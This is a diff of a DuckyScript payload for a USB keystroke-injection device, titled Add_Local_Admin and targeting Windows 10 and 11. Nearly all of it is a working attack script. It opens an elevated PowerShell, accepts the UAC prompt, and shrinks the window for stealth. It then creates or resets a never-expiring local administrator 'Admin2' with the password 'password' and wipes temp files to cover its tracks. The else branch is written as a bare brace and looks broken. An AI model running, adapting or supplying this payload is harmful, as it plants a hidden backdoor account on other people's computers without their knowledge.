@@ -1,80 +1,77 @@
-EM Title: Add_Local_Admin
+REM Title: Add_Local_Admin
 REM Author: LulzAnarchyAnon
 REM Description: Administrator PowerShell is opened, and resized for a more stealthy payload delivery, then the payload
 REM creates a local admin account on the target system, afterwards powershell exits, and all history is cleared.
 REM Target: Windows 10 and 11  
 REM Props: Darren Kitchen, and I am Jakoby
-REM Version: 2.0
+REM Version: 3.0
 REM Category: Execution
 
-REM Payload deployed, and completed in 34.46 sec. at current settings....
-
-
-DELAY 200
+DELAY 1000
 GUI r
-DELAY 200
+DELAY 500
 STRING powershell -Command "Start-Process PowerShell -Verb RunAs"  
 DELAY 500
 ENTER
 DELAY 500
 ALT y
-DELAY 500
+DELAY 1000
 STRING PowerShell.exe -noe -c ". mode.com con: lines=5 cols=12"
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 1000
 STRING $Username = "Admin2"
-DELAY 500
+DELAY 1000
 ENTER
 STRING $Password = "password"
-DELAY 500
+DELAY 1000
 ENTER
 STRING $group = "Administrators"
-DELAY 500
+DELAY 1000
 ENTER
 STRING $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
-DELAY 500
+DELAY 1000
 ENTER
 STRING $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
-DELAY 500
+DELAY 1000
 ENTER
 STRING if ($existing -eq $null) {
-DELAY 500
+DELAY 1000
 ENTER
 STRING Write-Host "Creating new local user $Username."
-DELAY 500
+DELAY 1000
 ENTER
 STRING & NET USER $Username $Password /add /y /expires:never
-DELAY 500  
+DELAY 1000  
 ENTER 
 STRING Write-Host "Adding local user $Username to $group."
-DELAY 500
+DELAY 1000
 ENTER
 STRING & NET LOCALGROUP $group $Username /add
-DELAY 500
+DELAY 1000
 ENTER
 STRING }
-DELAY 500
+DELAY 1000
 ENTER
 STRING      {
-DELAY 500
+DELAY 1000
 ENTER
 STRING Write-Host "Setting password for existing local user $Username."
-DELAY 500
+DELAY 1000
 ENTER
 STRING $existing.SetPassword($Password)
-DELAY 500
+DELAY 1000
 ENTER
 STRING }
-DELAY 500
+DELAY 1000
 ENTER
 STRING Write-Host "Ensuring password for $Username never expires."
-DELAY 500
+DELAY 1000
 ENTER
 STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 1000
 STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 DELAY 500
 ENTER
